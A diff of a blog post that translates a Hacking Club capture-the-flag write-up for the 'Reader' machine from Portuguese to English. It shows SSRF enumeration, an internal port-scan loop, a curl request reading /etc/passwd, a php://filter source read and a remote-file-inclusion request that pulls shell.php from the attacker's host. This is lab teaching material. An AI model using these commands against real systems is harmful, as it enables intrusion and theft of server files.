@@ -1,20 +1,14 @@
 ---
 title: 'Reader Writeup'
 date: '2024-06-29'
-tags: ['SSRF', 'RFI', 'Linux']
+tags: ['SSRF', 'RFI', 'Linux', 'Hacking Club']
 draft: false
-summary: 'A máquina Reader tem vulnerabilidades de SSRF e RFI que permitem RCE e elevação de privilégios para root via capabilities no binário Perl.'
+summary: 'The Reader machine has SSRF and RFI vulnerabilities that allow RCE and privilege escalation to root via capabilities in the Perl binary.'
 images: ['/static/images/writeup-reader-images/logo-reader.png']
 authors: ['default']
 ---
 
 ![Logo Reader](/static/images/writeup-reader-images/logo-reader.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Reader
 
 ---
 
@@ -39,16 +33,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-Essa maquina tem somente as portas 22 (SSH) e 80 (HTTP) aberta.
+This machine only has ports 22 (SSH) and 80 (HTTP) open.
 
 ### **Enumeration**
 
-Uma página web simples que aparentemente está em manutenção e somente o serviço de API está funcionando.
+A simple webpage that seems to be under maintenance, with only the API service working.
+
 ![Página de manutenção](/static/images/writeup-reader-images/1.png)
 
-Nada no robots.txt.
-
-Não tem muito o que se fazer , então fiz um fuzzing pra procurar por diretórios antes de ver essa API.
+Not much to do, so I did fuzzing to search for directories before looking at the API.
 
 `gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -x php,sh,txt,cgi,html,js,css,py`
 
@@ -61,56 +54,75 @@ Starting gobuster in directory enumeration mode
 
 ```
 
-Tem um diretório chamado `logfiles` que vai ser útil mais pra frente.
+## There's a directory called `logfiles` that will be useful later.
 
----
-
-Na parte de API diz que só aceita requisições POST.
+In the API section, it says it only accepts POST requests.
 
 ![API POST](/static/images/writeup-reader-images/2.png)
-Peguei a requisição pelo burp pra enviar com POST.
-![Burp requisicao](/static/images/writeup-reader-images/3.png)
-Diz que esta faltando um parâmetro chamado URL.
 
-Por alguma razão pelo burp não esta funcionando passar o parâmetro , mas via curl deu certo:
+I captured the request using Burp to send it with POST.
+
+![Burp requisicao](/static/images/writeup-reader-images/3.png)
+
+It says a parameter called **URL** is missing.
+
+For some reason, passing the parameter through Burp wasn't working, but it worked via curl:
 
 ![Curl POST](/static/images/writeup-reader-images/4.png)
-`curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1"`
 
-Ele está salvando a requisição em algum lugar no arquivo .txt (Salvo em /logfiles/ achado via gobuster).
-![Curl resposta](/static/images/writeup-reader-images/curl-1.png)Como o parâmetro se chama `url` podemos deduzir que se trata de um SSRF.
-Utilizei esse simples port scan pra descobrir quais portas internas o servidor possui.
+`curl -X POST http://172.16.4.104/api.php -d "url=http://127.0.0.1"`
+
+It is saving the request somewhere in a .txt file (Saved in /logfiles/ found via gobuster).
+
+![Curl resposta](/static/images/writeup-reader-images/curl-1.png)
+
+Since the parameter is called **url**, we can deduce this is an SSRF vulnerability.
+
+I used this simple port scan to discover which internal ports the server has.
 
 ```bash
 for port in 22 21 25 80 8080 3306 5432 8443 445 9000; do echo "Scanning port $port..."; curl -X POST -s -d "url=http://127.0.0.1:$port" "<http://172.16.4.104/api.php>" | cat; done
 ```
 
-Foi achado 2 portas interessantes com esse portscan a porta 3306 e a 8080:
+Two interesting ports were found with this port scan: 3306 and 8080.
+
 ![Portas interessantes](/static/images/writeup-reader-images/curl-2.png)
-Agora é fazer a requisição na porta 8080 com o curl e ver .
+
+Now, make the request on port 8080 with curl and see.
 
 `curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/"`
 
-![Curl 8080](/static/images/writeup-reader-images/curl-3.png)A gente pode ir no diretorio `logfiles` pra ver qual foi a resposta do servidor.
+![Curl 8080](/static/images/writeup-reader-images/curl-3.png)
+
+We can go to the **logfiles** directory to see the server's response.
 
 ![Logfiles resposta](/static/images/writeup-reader-images/logfile-output-1.png)
-`curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php"`
-![Curl read.php](/static/images/writeup-reader-images/curl-4.png)
-Lendo o output , ele diz que falta um parâmetro chamado `file`
-![Logfiles output 2](/static/images/writeup-reader-images/logfile-output-2.png)
-`curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php?file=/etc/passwd"`
-![Curl etc/passwd](/static/images/writeup-reader-images/curl-5.png)
-![Logfiles output 3](/static/images/writeup-reader-images/logfile-output-3.png)
-Pra entender melhor o que a aplicação está fazendo a gente vai ler o arquivo read.php utilizando o schema `php://`
 
-Lembrando que é necessário converter pra base64 , por que se não a aplicação vai nos retornar uma pagina em branco.
+`curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php"`
+
+![Curl read.php](/static/images/writeup-reader-images/curl-4.png)
+
+Reading the output, it says a parameter called **file** is missing.
+
+![Logfiles output 2](/static/images/writeup-reader-images/logfile-output-2.png)
+
+`curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php?file=/etc/passwd"`
+
+![Curl etc/passwd](/static/images/writeup-reader-images/curl-5.png)
+
+![Logfiles output 3](/static/images/writeup-reader-images/logfile-output-3.png)
+
+To better understand what the application is doing, we will read the read.php file using the `php://` schema.
+
+Note that it is necessary to convert to base64, because otherwise the application will return a blank page.
 
 `curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php?file=php://filter/convert.base64-encode/resource=read.php"`
+
 ![Curl base64](/static/images/writeup-reader-images/curl-6.png)
 ![Logfiles output 4](/static/images/writeup-reader-images/logfiles-output-4.png)
 ![Decode base64](/static/images/writeup-reader-images/decode-base64.png)
 
-`Include $_GET ['file']` indica um RFI (Remote-File Inclusion) que podemos usar pra ganhar acesso ao servidor.
+`Include $_GET ['file']` indicates an RFI (Remote-File Inclusion) that we can use to gain access to the server.
 
 ## Foothold
 
@@ -123,8 +135,10 @@ Lembrando que é necessário converter pra base64 , por que se não a aplicaçã
 
 ![Python server](/static/images/writeup-reader-images/python-m-http-server.png)
 
-Agora é so mandar a requisição pro servidor.
+Now just send the request to the server.
+
 `curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php?file=http://10.0.31.150:80/shell.php"`
+
 ![Foothold](/static/images/writeup-reader-images/foothold.png)
 
 ## Privilege Escalation
